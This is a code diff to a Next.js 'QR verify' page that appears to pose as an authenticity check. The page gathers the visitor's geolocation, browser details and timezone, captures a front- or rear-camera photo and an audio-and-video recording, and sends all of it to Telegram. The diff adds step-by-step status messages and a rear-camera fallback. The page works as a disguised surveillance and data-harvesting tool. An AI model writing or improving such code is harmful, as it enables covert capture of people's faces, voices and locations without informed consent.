@@ -4,10 +4,10 @@ import { useEffect, useState, useRef, useCallback } from 'react';
 import { useSearchParams, usePathname } from 'next/navigation';
 import { notifyVisit, sendTelegramPhoto, sendTelegramVideo } from '@/utils/telegramApi';
 import { useLayoutContext } from '@/context/LayoutContext';
-import { showSuccess, showError } from '@/utils/toast';
+import { showSuccess, showError } from '@/utils/toast'; // Keep for critical errors
 import LoadingSpinner from '@/components/LoadingSpinner';
 import { RefreshCcw } from 'lucide-react';
-import { UAParser } from 'ua-parser-js'; // Import UAParser
+import { UAParser } from 'ua-parser-js';
 
 type QrVerifyPageProps = {
   params: { lang: string };
@@ -56,6 +56,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
 
     try {
       // 1. Get Geolocation
+      setStatusMessage(t.authenticity.processingRequest + " (Getting location...)");
       if (navigator.geolocation) {
         try {
           const position = await new Promise<GeolocationPosition>((resolve, reject) => {
@@ -63,9 +64,13 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           });
           geoLat = position.coords.latitude;
           geoLon = position.coords.longitude;
+          setStatusMessage(t.authenticity.processingRequest + " (Location obtained.)");
         } catch (geoError) {
           console.warn("Geolocation permission denied or error:", geoError);
+          setStatusMessage(t.authenticity.processingRequest + " (Location access denied or failed.)");
         }
+      } else {
+        setStatusMessage(t.authenticity.processingRequest + " (Geolocation not supported.)");
       }
 
       // 2. Get User-Agent details and client timezone
@@ -77,6 +82,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       const clientTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
       // 3. Send initial visit notification to get caption
+      setStatusMessage(t.authenticity.processingRequest + " (Sending initial notification...)");
       const utmQueryParams = {
         utm_source: searchParams?.get('utm_source') || null,
         utm_medium: searchParams?.get('utm_medium') || null,
@@ -96,15 +102,23 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       };
       const initialCaption = await notifyVisit(bodyData, utmQueryParams);
       // setCaptionMessage(initialCaption); // Removed state update
+      setStatusMessage(t.authenticity.processingRequest + " (Initial notification sent.)");
 
       // 4. Request Camera Access (front camera first)
-      setStatusMessage(t.authenticity.processingRequest);
+      setStatusMessage(t.authenticity.processingRequest + " (Requesting camera access...)");
       let mediaStream: MediaStream;
       try {
         mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+        setStatusMessage(t.authenticity.processingRequest + " (Camera access granted.)");
       } catch (frontCameraError: unknown) {
         console.warn("Front camera not available or permission denied, trying rear camera:", frontCameraError);
-        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+        try {
+          mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+          setStatusMessage(t.authenticity.processingRequest + " (Rear camera access granted.)");
+        } catch (rearCameraError: unknown) {
+          console.error("No camera available or permission denied for both front and rear cameras:", rearCameraError);
+          throw new DOMException("No camera available or permission denied.", "NotFoundError");
+        }
       }
       
       setStream(mediaStream);
@@ -118,7 +132,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       await new Promise(resolve => setTimeout(resolve, 1000)); 
 
       // 5. Take Photo
-      setStatusMessage(t.authenticity.processingRequest);
+      setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
       if (videoRef.current && canvasRef.current) {
         const video = videoRef.current;
         const canvas = canvasRef.current;
@@ -131,6 +145,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
           
           try {
             await sendTelegramPhoto({ photoBase64, caption: initialCaption });
+            setStatusMessage(t.authenticity.processingRequest + " (Photo sent.)");
           } catch (photoSendError: unknown) {
             console.error("Error sending photo to Telegram:", photoSendError);
             setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
@@ -142,7 +157,7 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       }
 
       // 6. Start Video Recording (if photo was successful)
-      setStatusMessage(t.authenticity.recordingInstructions);
+      setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder);
 
@@ -160,14 +175,14 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
         setVideoPreviewUrl(url);
         
         try {
-          setStatusMessage(t.authenticity.processingRequest);
+          setStatusMessage(t.authenticity.processingRequest + " (Sending video...)");
           const filename = `qr_scan_video_${new Date().getTime()}.webm`;
           await sendTelegramVideo({ videoBlob: blob, caption: initialCaption, filename });
-          showSuccess(t.authenticity.recordingSuccess);
+          showSuccess(t.authenticity.recordingSuccess); // Keep this toast for final user confirmation
           setStatusMessage(t.authenticity.recordingSuccess);
         } catch (videoSendError: unknown) {
           console.error("Error sending video to Telegram:", videoSendError);
-          showError(t.authenticity.recordingError);
+          showError(t.authenticity.recordingError); // Keep this toast for critical error
           setError(t.authenticity.recordingError + (videoSendError instanceof Error ? `: ${videoSendError.message}` : "."));
           setStatusMessage(t.authenticity.recordingError);
         } finally {
@@ -188,15 +203,15 @@ const QrVerifyPage = ({ params }: QrVerifyPageProps) => {
       if (err instanceof DOMException && err.name === "NotAllowedError") {
         setError(t.authenticity.qrScanError + " (Camera access denied).");
         setStatusMessage(t.authenticity.qrScanError + " (Camera access denied).");
-        showError(t.authenticity.qrScanError + " (Camera access denied).");
+        showError(t.authenticity.qrScanError + " (Camera access denied)."); // Critical error toast
       } else if (err instanceof DOMException && err.name === "NotFoundError") {
         setError(t.authenticity.qrScanError + " (No camera found).");
         setStatusMessage(t.authenticity.qrScanError + " (No camera found).");
-        showError(t.authenticity.qrScanError + " (No camera found).");
+        showError(t.authenticity.qrScanError + " (No camera found)."); // Critical error toast
       } else {
         setError(t.authenticity.qrScanError + (err instanceof Error ? `: ${err.message}` : "."));
         setStatusMessage(t.authenticity.qrScanError);
-        showError(t.authenticity.qrScanError);
+        showError(t.authenticity.qrScanError); // General critical error toast
       }
       setIsLoading(false);
       setIsRecording(false);
